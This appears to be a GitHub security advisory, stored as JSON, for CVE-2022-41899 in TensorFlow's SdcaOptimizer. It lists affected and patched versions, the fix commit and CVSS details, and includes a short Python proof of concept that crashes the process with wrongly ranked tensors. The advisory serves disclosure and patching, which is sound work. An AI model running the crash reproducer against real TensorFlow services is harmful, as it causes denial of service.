{
    "Title": "`CHECK` fail via inputs in `SdcaOptimizer`",
    "Meta": {
        "Package": [
            "tensorflow([pip](/advisories?query=ecosystem%3Apip))"
        ],
        "Affected versions": [
            "< 2.8.4",
            ">= 2.9.0, < 2.9.3",
            ">= 2.10.0, < 2.10.1"
        ],
        "Patched versions": [
            "2.8.4",
            "2.9.3",
            "2.10.1"
        ]
    },
    "Description": "### Impact\n\nInputs `dense_features` or `example_state_data` not of rank 2 will trigger a\n`CHECK` fail in\n[`SdcaOptimizer`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sdca_internal.cc).\n\n    \n    \n    import tensorflow as tf\n    \n    tf.raw_ops.SdcaOptimizer(\n        sparse_example_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n        sparse_feature_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n        sparse_feature_values=8 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n        dense_features=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n        example_weights=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n        example_labels=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n        sparse_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n        sparse_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n        dense_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n        example_state_data=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n        loss_type=\"squared_loss\",\n        l1=0.0,\n        l2=0.0,\n        num_loss_partitions=1,\n        num_inner_iterations=1,\n        adaptative=False,)\n\n### Patches\n\nWe have patched the issue in GitHub commit\n[80ff197d03db2a70c6a111f97dcdacad1b0babfa](https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this\ncommit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also\naffected and still in supported range.\n\n### For more information\n\nPlease consult [our security\nguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for\nmore information regarding the security model and how to contact us with\nissues and questions.\n\n### Attribution\n\nThis vulnerability has been reported by Zizhuang Deng of IIE, UCAS\n\n### References\n\n  * [GHSA-27rc-728f-x5w2](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-27rc-728f-x5w2 \"GHSA-27rc-728f-x5w2\")\n  * <https://nvd.nist.gov/vuln/detail/CVE-2022-41899>\n  * [tensorflow/tensorflow@`80ff197`](https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa)\n  * <https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sdca_internal.cc>\n\n",
    "Severity": {
        "Score": "4.8/ 10 (Moderate)",
        "CVSS base metrics": {
            "Attack vector": "Network",
            "Attack complexity": "High",
            "Privileges required": "Low",
            "User interaction": "Required",
            "Scope": "Unchanged",
            "Confidentiality": "None",
            "Integrity": "None",
            "Availability": "High"
        },
        "CVSS string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:H"
    },
    "Weaknesses": [
        "[CWE-20](/advisories?query=cwe%3A20)",
        "[CWE-617](/advisories?query=cwe%3A617)"
    ],
    "CVE ID": "CVE-2022-41899",
    "GHSA ID": "GHSA-27rc-728f-x5w2",
    "Source code": "[tensorflow/tensorflow](https://github.com/tensorflow/tensorflow)"
}